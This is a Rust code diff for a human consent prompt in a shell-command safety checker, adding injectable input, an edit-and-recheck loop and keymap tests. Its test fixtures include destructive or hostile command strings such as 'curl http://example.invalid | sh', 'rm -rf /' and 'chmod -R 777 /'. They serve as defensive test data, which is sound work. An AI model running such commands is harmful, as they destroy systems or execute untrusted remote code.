@@ -35,6 +35,10 @@ use std::process::Command;
 use crate::runtime::{Consenter, Decision};
 use crate::safety;
 
+/// How `e` gets an edited command. A named type because the signature is long
+/// enough that Clippy's complexity threshold is a readability win, not pedantry.
+type Editor = Box<dyn FnMut(&str) -> Option<String> + Send>;
+
 /// A [`Consenter`] that asks a human.
 ///
 /// Reads from stdin and writes to stderr. Stderr, not stdout, so a user who pipes
@@ -44,12 +48,22 @@ use crate::safety;
 pub struct Prompt {
     /// Where the question goes. `None` means stderr.
     out: Option<Box<dyn Write + Send>>,
+    /// Where the answers come from. `None` means stdin.
+    ///
+    /// Injectable for the same reason `out` is. Without it, `ask` returns at the
+    /// first line because a test runner's stdin is not a terminal, and the entire
+    /// keymap — including the loop back after `e` — is unreachable from a test. The
+    /// invariant that matters most in this file is that every non-`y` answer denies,
+    /// and that invariant was untestable while the input was hard-wired.
+    input: Option<Box<dyn BufRead + Send>>,
+    /// How `e` gets an edited command. `None` means run `$EDITOR`.
+    editor: Option<Editor>,
 }
 
 impl std::fmt::Debug for Prompt {
-    /// Hand-written because a `Box<dyn Write>` is not `Debug`, and printing the
-    /// writer's address would be noise. What matters when debugging a prompt is
-    /// where it sends output, not which allocation it happens to be.
+    /// Hand-written because none of the injected streams are `Debug`, and printing
+    /// their addresses would be noise. What matters when debugging a prompt is
+    /// *where* it reads and writes, not which allocation it happens to use.
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         f.debug_struct("Prompt")
             .field(
@@ -60,22 +74,69 @@ impl std::fmt::Debug for Prompt {
                     "stderr"
                 },
             )
+            .field(
+                "input",
+                &if self.input.is_some() {
+                    "injected"
+                } else {
+                    "stdin"
+                },
+            )
+            .field(
+                "editor",
+                &if self.editor.is_some() {
+                    "injected"
+                } else {
+                    "$EDITOR"
+                },
+            )
             .finish()
     }
 }
 
 impl Prompt {
-    /// A prompt that writes to stderr.
+    /// A prompt that writes to stderr and reads from stdin.
     #[must_use]
     pub fn stderr() -> Self {
-        Self { out: None }
+        Self {
+            out: None,
+            input: None,
+            editor: None,
+        }
     }
 
     /// A prompt that writes to `out` instead, for tests and for embedding.
+    #[must_use]
     pub fn to(out: impl Write + Send + 'static) -> Self {
         Self {
             out: Some(Box::new(out)),
+            input: None,
+            editor: None,
         }
+    }
+
+    /// A prompt that reads answers from `in`.
+    ///
+    /// Supplying input is also what makes the prompt interactive: the terminal check
+    /// is about whether a *human* can answer, and a caller that has handed over an
+    /// answer stream has answered that. Without this, a test could only ever reach
+    /// the refusal path.
+    #[must_use]
+    pub fn reading(mut self, input: impl BufRead + Send + 'static) -> Self {
+        self.input = Some(Box::new(input));
+        self
+    }
+
+    /// A prompt whose `e` key calls `edit` instead of `$EDITOR`.
+    ///
+    /// Injecting the editor is what makes the review loop testable. Reaching it the
+    /// honest way needs `std::env::set_var`, which is process-global and `unsafe` in
+    /// edition 2024, so a test would be racing every other test for `$EDITOR` and
+    /// would be unable to assert anything about the loop it is trying to cover.
+    #[must_use]
+    pub fn editing(mut self, edit: impl FnMut(&str) -> Option<String> + Send + 'static) -> Self {
+        self.editor = Some(Box::new(edit));
+        self
     }
 
     /// Whether a human can be reached at all.
@@ -87,11 +148,27 @@ impl Prompt {
         io::stdin().is_terminal()
     }
 
-    /// A writer for one block of output.
-    fn writer(&mut self) -> Box<dyn Write> {
-        match self.out.take() {
-            Some(w) => w,
-            None => Box::new(io::stderr()),
+    /// Whether *this* prompt can ask a question.
+    ///
+    /// True when answers were injected, otherwise the terminal check.
+    fn can_ask(&self) -> bool {
+        self.input.is_some() || Self::is_interactive()
+    }
+
+    /// Runs `f` against the prompt's output stream.
+    ///
+    /// A closure rather than a returned `&mut dyn Write`, because the stderr case
+    /// has no value to borrow: `io::stderr()` is a fresh handle each time. The
+    /// earlier version took the writer out of `self`, so the block dropped it on the
+    /// way out and the *second* write in the same prompt found `self.out` empty and
+    /// fell through to stderr. With the default prompt that is invisible — stderr is
+    /// what it wanted anyway — but an injected writer silently stopped receiving
+    /// output after the first block, which made the `r`, `?`, and `e` paths
+    /// untestable and hid the bug.
+    fn with_writer(&mut self, f: impl FnOnce(&mut dyn Write) -> io::Result<()>) -> io::Result<()> {
+        match self.out {
+            Some(ref mut w) => f(w.as_mut()),
+            None => f(&mut io::stderr()),
         }
     }
 
@@ -101,52 +178,85 @@ impl Prompt {
     /// decoration: "MEDIUM" alone tells a user nothing about whether it is their
     /// own project directory or someone else's home.
     fn render(&mut self, command: &str, verdict: &safety::Verdict) -> io::Result<()> {
-        let mut out = self.writer();
-        writeln!(out)?;
-        writeln!(out, "  {command}")?;
-        writeln!(out, "  {}", verdict.summary())?;
-        for reason in verdict.reason_messages() {
-            writeln!(out, "    - {reason}")?;
-        }
-        out.flush()
+        self.with_writer(|out| {
+            writeln!(out)?;
+            writeln!(out, "  {command}")?;
+            writeln!(out, "  {}", verdict.summary())?;
+            for reason in verdict.reason_messages() {
+                writeln!(out, "    - {reason}")?;
+            }
+            out.flush()
+        })
     }
 
     /// Writes the key legend.
     fn legend(&mut self) -> io::Result<()> {
-        let mut out = self.writer();
-        writeln!(
-            out,
-            "  [y] run it  [n/Esc] cancel  [e] edit and re-check  [?] why"
-        )?;
-        write!(out, "  default is no\n> ")?;
-        out.flush()
+        self.with_writer(|out| {
+            writeln!(
+                out,
+                "  [y] run it  [n/Esc] cancel  [e] edit and re-check  [?] why"
+            )?;
+            write!(out, "  default is no\n> ")?;
+            out.flush()
+        })
     }
 
     /// Prints the plain-language explanation for `?`.
     fn explain(&mut self, verdict: &safety::Verdict) -> io::Result<()> {
-        let mut out = self.writer();
-        write!(out, "\n{}", verdict.explanation())?;
-        out.flush()
+        self.with_writer(|out| {
+            write!(out, "\n{}", verdict.explanation())?;
+            out.flush()
+        })
     }
 
     /// Reads one answer. `None` at end of input or on error, both of which the
     /// caller must treat as no.
-    fn read_line() -> Option<String> {
-        let stdin = io::stdin();
+    fn read_line(&mut self) -> Option<String> {
         let mut buf = String::new();
-        match stdin.lock().read_line(&mut buf) {
-            Ok(0) | Err(_) => None,
-            Ok(_) => Some(buf),
+        if let Some(input) = &mut self.input {
+            return read_one(input, &mut buf);
         }
+        let stdin = io::stdin();
+        read_one(&mut stdin.lock(), &mut buf)
     }
+}
 
+/// One line, or `None`. `Ok(0)` is end of input, which for a prompt is the end of
+/// consent, not a blank line to be re-read.
+fn read_one(reader: &mut impl BufRead, buf: &mut String) -> Option<String> {
+    match reader.read_line(buf) {
+        Ok(0) | Err(_) => None,
+        Ok(_) => Some(std::mem::take(buf)),
+    }
+}
+
+impl Prompt {
     /// Runs `$EDITOR` on `command` and returns what the user saved.
     ///
     /// Returns `None` if there is no editor, the editor exits non-zero, or the
     /// file cannot be written or read. Every one of those is "no", never "the
     /// original command unchanged" — an editor that fails must not let the
     /// pre-edit command through as if it had been reviewed.
-    fn edit(command: &str) -> Option<String> {
+    fn edit(&mut self, command: &str) -> Option<String> {
+        let edited = match self.editor {
+            Some(ref mut injected) => injected(command),
+            None => Self::edit_with_env_editor(command),
+        }?;
+        // Normalisation lives here, above the dispatch, not inside the `$EDITOR`
+        // path. An editor that saves an empty file, or one that leaves the trailing
+        // newline `vim` always adds, has to be refused or trimmed the same way
+        // whichever editor produced the text — and an injected editor that skipped
+        // this could hand back `""`, which is worse than doing nothing because it
+        // looks like a success.
+        let trimmed = edited.trim();
+        if trimmed.is_empty() {
+            return None;
+        }
+        Some(trimmed.to_owned())
+    }
+
+    /// The real `$EDITOR` path, split out so `edit` stays total and testable.
+    fn edit_with_env_editor(command: &str) -> Option<String> {
         let editor = std::env::var("EDITOR").ok()?;
         if editor.trim().is_empty() {
             return None;
@@ -169,15 +279,9 @@ impl Prompt {
             let _ = std::fs::remove_file(&path);
             return None;
         }
-        let edited = std::fs::read_to_string(&path).ok().unwrap_or_default();
+        let edited = std::fs::read_to_string(&path).ok()?;
         let _ = std::fs::remove_file(&path);
-        let trimmed = edited.trim();
-        // An emptied command is not a command. Running `""` is worse than doing
-        // nothing, because it looks like a success.
-        if trimmed.is_empty() {
-            return None;
-        }
-        Some(trimmed.to_owned())
+        Some(edited)
     }
 }
 
@@ -193,42 +297,59 @@ impl Consenter for Prompt {
     /// UI can bypass is not a safety rule (ADR 0004).
     fn ask(&mut self, command: &str, verdict: &safety::Verdict) -> Decision {
         // No terminal, no prompt, no run.
-        if !Self::is_interactive() {
+        if !self.can_ask() {
             return Decision::Denied;
         }
         if self.render(command, verdict).is_err() {
             return Decision::Denied;
         }
+        // The command on screen, and its classification. Both are `mut` because
+        // `e` replaces them and the loop goes round again: an edit that the user
+        // cannot see before approving is not a review step.
+        let mut current = command.to_owned();
+        let mut current_verdict = verdict.clone();
+
         loop {
             if self.legend().is_err() {
                 return Decision::Denied;
             }
-            let Some(line) = Self::read_line() else {
+            let Some(line) = self.read_line() else {
                 // EOF, or a broken stdin. Not consent.
                 return Decision::Denied;
             };
             match line.trim().to_ascii_lowercase().as_str() {
-                "y" => return Decision::Granted(command.to_owned()),
+                "y" => return Decision::Granted(current),
                 // Every other answer, including the clipboard key, is a refusal.
                 // Collected here so the list of "no" is one arm: adding a key that
                 // grants must be a deliberate edit to this line.
                 "" | "n" | "q" | "c" => return Decision::Denied,
                 "?" => {
-                    let _ = self.explain(verdict);
+                    let _ = self.explain(&current_verdict);
                 }
                 "r" => {
-                    if self.render(command, verdict).is_err() {
+                    if self.render(&current, &current_verdict).is_err() {
                         return Decision::Denied;
                     }
                 }
                 "e" => {
-                    // The core re-checks whatever comes back, so returning the
-                    // edited text is safe: an edit that turns a HIGH command into
-                    // a CRITICAL one is refused there, not here.
-                    return match Self::edit(command) {
-                        Some(edited) => Decision::Granted(edited),
-                        None => Decision::Denied,
+                    // Re-classify the edited text here so the *next* render and
+                    // the next `?` describe the command that will actually run.
+                    //
+                    // This is a display concern only. The core re-classifies again
+                    // before it acts, and `Decision::Granted` carries a `String`
+                    // precisely so it can: an edit that turns HIGH into CRITICAL
+                    // cannot run whichever turn of this loop it was typed on.
+                    let Some(edited) = self.edit(&current) else {
+                        // The editor failed or produced nothing. Refuse rather
+                        // than guess: the user asked to review something and the
+                        // review did not happen.
+                        return Decision::Denied;
                     };
+                    current_verdict = safety::classify(&edited);
+                    current = edited;
+                    if self.render(&current, &current_verdict).is_err() {
+                        return Decision::Denied;
+                    }
                 }
                 // Anything else re-asks. It is never a yes.
                 _ => {}
@@ -335,5 +456,218 @@ mod tests {
             verdict.reason_messages()
         );
         assert!(!verdict.pattern_ids().is_empty());
+    }
+
+    // ── the keymap, which was unreachable until the input was injectable ───
+
+    /// Drives the prompt with scripted answers and returns what it decided.
+    fn ask(answers: &str, command: &str) -> Decision {
+        let verdict = safety::classify(command);
+        let mut p = Prompt::to(Vec::new()).reading(io::Cursor::new(answers.to_owned()));
+        p.ask(command, &verdict)
+    }
+
+    fn rendered(answers: &str, command: &str) -> (Decision, String) {
+        let verdict = safety::classify(command);
+        let sink = Sink::default();
+        let mut prompt = Prompt::to(sink.clone()).reading(io::Cursor::new(answers.to_owned()));
+        let decision = prompt.ask(command, &verdict);
+        (decision, sink.text())
+    }
+
+    #[test]
+    fn y_grants_the_command_it_was_shown() {
+        assert_eq!(
+            ask("y\n", "rm -rf ./build"),
+            Decision::Granted("rm -rf ./build".into())
+        );
+    }
+
+    /// Only a bare `y` grants. It is case-insensitive and whitespace-tolerant
+    /// because those are the same intent. It is deliberately not a prefix match:
+    /// `yes`, `yep` and `yy` are not the key the legend offers, and a key that
+    /// grants must be one a deliberate edit added to the match arm.
+    #[test]
+    fn a_bare_y_grants_in_any_case_with_any_padding() {
+        for answer in ["y", "Y", "  y  ", "\ty\n"] {
+            match ask(&format!("{answer}\n"), "rm -rf ./build") {
+                Decision::Granted(c) => assert_eq!(c, "rm -rf ./build", "{answer:?}"),
+                denied @ Decision::Denied => panic!("{answer:?} must be a yes, got {denied:?}"),
+            }
+        }
+    }
+
+    /// The invariant this file exists to hold: everything that is not an explicit
+    /// yes denies. Each of these is a way a user might express "no", or a way the
+    /// input stream might surprise the prompt.
+    #[test]
+    fn everything_that_is_not_a_yes_denies() {
+        for answer in [
+            "", "n", "N", "q", "c", "\n", "nope", "y es", "yep", "yes", "yy", "0", "no",
+        ] {
+            assert_eq!(
+                ask(&format!("{answer}\n"), "rm -rf ./build"),
+                Decision::Denied,
+                "{answer:?} must not grant anything"
+            );
+        }
+    }
+
+    #[test]
+    fn end_of_input_denies() {
+        // No newline at all: the stream simply ran out, which is what a closed pipe
+        // or a Ctrl-D looks like from here.
+        assert_eq!(ask("", "rm -rf ./build"), Decision::Denied);
+    }
+
+    #[test]
+    fn an_unknown_key_re_asks_and_does_not_consume_the_next_answer() {
+        assert_eq!(
+            ask("wat\ny\n", "rm -rf ./build"),
+            Decision::Granted("rm -rf ./build".into()),
+            "a key the prompt does not know must be skipped, not treated as an answer"
+        );
+    }
+
+    #[test]
+    fn question_mark_explains_and_asks_again() {
+        let (decision, text) = rendered("?\ny\n", "rm -rf /etc/x");
+        assert!(matches!(decision, Decision::Granted(_)), "{decision:?}");
+        assert!(
+            text.contains("what it does"),
+            "`?` prints the long explanation: {text}"
+        );
+        assert_eq!(
+            text.matches("rm -rf /etc/x").count(),
+            1,
+            "`?` explains and re-asks; it must not quietly substitute a different \
+             command: {text}"
+        );
+        assert_eq!(
+            text.matches("default is no").count(),
+            2,
+            "the legend is redrawn for the re-asked question: {text}"
+        );
+    }
+
+    #[test]
+    fn r_redraws_the_block_without_asking_a_second_question() {
+        let (decision, text) = rendered("r\ny\n", "rm -rf ./build");
+        assert!(matches!(decision, Decision::Granted(_)), "{decision:?}");
+        assert_eq!(
+            text.matches("rm -rf ./build").count(),
+            2,
+            "`r` is a redraw of the same command, not a new one: {text}"
+        );
+        assert_eq!(
+            text.matches("default is no").count(),
+            2,
+            "one legend per question asked: {text}"
+        );
+    }
+
+    /// Drives the prompt with a scripted editor and scripted answers.
+    fn ask_with_editor(
+        answers: &str,
+        command: &str,
+        edit: impl FnMut(&str) -> Option<String> + Send + 'static,
+    ) -> (Decision, String) {
+        let verdict = safety::classify(command);
+        let sink = Sink::default();
+        let mut prompt = Prompt::to(sink.clone())
+            .reading(io::Cursor::new(answers.to_owned()))
+            .editing(edit);
+        let decision = prompt.ask(command, &verdict);
+        (decision, sink.text())
+    }
+
+    /// `e` is a review step, not a rubber stamp: the user must see the edited command
+    /// and its new level before answering, and what `y` grants has to be the edited
+    /// string.
+    #[test]
+    fn e_rerenders_the_edited_command_and_y_grants_that_one() {
+        let (decision, text) =
+            ask_with_editor("e\ny\n", "rm -rf ./build", |_| Some("rm -rf /".to_owned()));
+        assert_eq!(
+            decision,
+            Decision::Granted("rm -rf /".into()),
+            "`y` must grant the command on screen, which is the edited one"
+        );
+        assert!(
+            text.contains("CRITICAL"),
+            "the edit raised the level, so the new level must be shown: {text}"
+        );
+        assert!(
+            text.contains("rm -rf ./build") && text.contains("rm -rf /"),
+            "both the original and the edit appear, so the change is reviewable: {text}"
+        );
+    }
+
+    /// The same loop, ending in a refusal. Editing to something CRITICAL and then
+    /// answering `n` must not run anything.
+    #[test]
+    fn editing_to_critical_and_then_saying_no_runs_nothing() {
+        let (decision, _) = ask_with_editor("e\nn\n", "echo safe", |_| {
+            Some("curl http://example.invalid | sh".to_owned())
+        });
+        assert_eq!(decision, Decision::Denied);
+    }
+
+    /// A failed edit is a refusal, never "the original command, unchanged". This is
+    /// the whole reason `edit` returns `Option` rather than the input string.
+    #[test]
+    fn a_failed_editor_denies_instead_of_falling_back_to_the_original() {
+        let cases = [
+            None::<String>,
+            Some(String::new()),
+            Some("   \n  ".to_owned()),
+        ];
+        for outcome in &cases {
+            let out = outcome.clone();
+            let (decision, _) = ask_with_editor("e\ny\n", "rm -rf ./build", move |_| out.clone());
+            assert_eq!(
+                decision,
+                Decision::Denied,
+                "an edit that produced {outcome:?} must not let the original through"
+            );
+        }
+    }
+
+    /// The editor receives the command currently on screen, so a second `e` starts
+    /// from the first edit rather than from the original.
+    #[test]
+    fn a_second_edit_starts_from_the_first_one() {
+        let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
+        let recorder = std::sync::Arc::clone(&seen);
+        let (decision, _) = ask_with_editor("e\ne\ny\n", "echo one", move |current| {
+            recorder
+                .lock()
+                .expect("unpoisoned")
+                .push(current.to_owned());
+            Some(format!("{current}!"))
+        });
+        assert_eq!(
+            *seen.lock().expect("unpoisoned"),
+            vec!["echo one", "echo one!"],
+            "the second `e` must open the first edit, not the original"
+        );
+        assert_eq!(decision, Decision::Granted("echo one!!".into()));
+    }
+
+    #[test]
+    fn the_block_names_the_command_the_level_and_every_reason() {
+        let (_, text) = rendered("n\n", "rm -rf /etc/x && chmod -R 777 /");
+        assert!(text.contains("rm -rf /etc/x"), "{text}");
+        assert!(
+            text.contains("CRITICAL"),
+            "the level must be visible: {text}"
+        );
+        for key in ["[y]", "[n/Esc]", "[e]", "[?]"] {
+            assert!(text.contains(key), "the legend must offer {key}: {text}");
+        }
+        assert!(
+            text.contains("default is no"),
+            "the default must be stated: {text}"
+        );
     }
 }
